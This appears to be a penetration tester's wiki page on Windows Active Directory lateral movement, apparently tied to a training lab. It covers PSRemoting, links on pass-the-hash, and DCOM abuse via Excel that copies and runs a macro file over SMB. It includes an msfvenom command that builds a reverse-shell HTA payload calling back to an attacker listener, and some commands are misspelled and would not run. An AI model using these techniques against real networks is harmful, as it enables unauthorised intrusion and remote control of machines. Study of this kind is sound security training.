# Windows Network Lateral Movement
The articles [[Networks/Network-Theory/Network-Protocols/Network-Protocols]], [[Networks/Network-Protocols]] and [[Windows-Networking]] will provide theory background information, while [[Windows-Networking-Commands]], [[Windows-Commands]] ,[[SMB-Recon-Cheatsheet]] and [[RPCClient-Cheatsheet]] articles will provide command cheatsheet referal.

The are many ways to navigate the network and move laterally through it, the most stealthier from an attacker perspective is to use live off the land and sue common Administrative Tools or by emulating regular user behaviour, but also SysAdmin behaviour - why would a local admin connect from machine that has no reason to connect to another.

This article will require some knowledge of **Integrity Tokens** [[Bypassing-Windows-User-Account-Control]] and [[Windows-User-Account-Control]] as the restrictions imposed by this system, some methods may fail due UAC enforcement. Also Domain and Local Administrators are different objects, but Domain Admins with Local Admin privileges will not be subject to the same checks as a Local Admin. For remote restrictions made by UAC documentation see [UAC Remote Restriction Documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) 

## Contents

[[AD-Lateral-Movement-Spawning-Remote-Processes]]
[[AD-Lateral-Movement-With-WMI]]
[[AD-Lateral-Movement-Alternate-Authenication-Material]]
[[AD-Lateral-Movement-Abusing-User-Behaviour]]

## Port Redirection

Often in real-world networks, Administrator with block some ports for security reassons or have implemented segmentation around the network preventing SMB, RDP, WinRM or RPC ports. Therefore  [[Port-Redirection-And-Tunneling]] is used to bypass these restrictions.

## Exploitation Hashes and Ticket passing for Lateral Movement

See indiviual articles:
[[Pass-The-Hash]]
[[Overpass-The-Hash]]
[[Pass-The-Ticket]]

## PSRemoting

```powershell
$pass = convertto-securestring -asplaintext -force -string ""
$cred = new-object -typename system.management.automation.pscredential -arguementlist "",$pass
$session = newpssession -computername dc01 -credential $cred
enter-pssession -session $sessions
# Sometimes you need to use invoke command instead of $session creation due to shell limitations
invoke-comand -computername $computername -ScriptBlock { whoami /all }  -Credential $cred
# PSRemoting may require a specific configuration as it is a restricting psremoting onto DCs:
-ConfigurationName $configName
```

You can also use [[Impacket-Cheatsheet]]

## Distributed Component Object Model(DCOM)
[The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other](https://en.wikipedia.org/wiki/Component_Object_Model). Similar to [[Object-Oriented-Programming]], but for OS objects and thier interactions. [DCOM](https://en.wikipedia.org/wiki/Distributed_Component_Object_Model) being *Distributed* object across a Windows Network. They ancient technologies that are present in the early days of Windows. One of many [[Networks/Network-Protocols]] used in AD it specifically interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API. [Enigmaox3](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)

There are various Microsoft Office DCOM objects that allow for lateral movement.
```powershell
# Create an instance, listing all avaliable methods 
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "$IP"))
$com | Get-Member
```
With the `Run` method we can run VBA macro remotely.
```vba
Sub mymacro()
    Shell ("cmd.exe")
End Sub
```
Using legacy .xls formatting the macro is write inside the Office \*-application and then copied to a remote filesystem through SMB using .NET `Copy` method of `System.IO.File` class.
```powershell
$LocalPath = "C:\Users\Administrator\mytrojan.xls"
$RemotePath = "\\$IP\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```
To then open it remotely
```powershell
$Path = "\\$IP\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```

The base64 encode [[MSFvenom-Payloads]] command to create HTA attack is:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f hta-psh -o evil.hta
```
The LHOST can be the DC that can called back to a listener.

[[Impacket-Cheatsheet]] with dccomexec.py

## Pass the ccache
[hackingarticles](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)



## References

[Lateral movement and pivoting THM Room](https://tryhackme.com/room/lateralmovementandpivoting)[hackingarticles](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)
[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) 
[Psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
[Metasploit PsExec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
[Alternate PtH methods](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/0)
[Graeber BH Whitepaper](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
[DCOM](https://en.wikipedia.org/wiki/Distributed_Component_Object_Model) 
[COM](https://en.wikipedia.org/wiki/Component_Object_Model)
[MS DCOM Documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN) 
[Enigmaox3](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
[UAC Remote Restriction Documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) 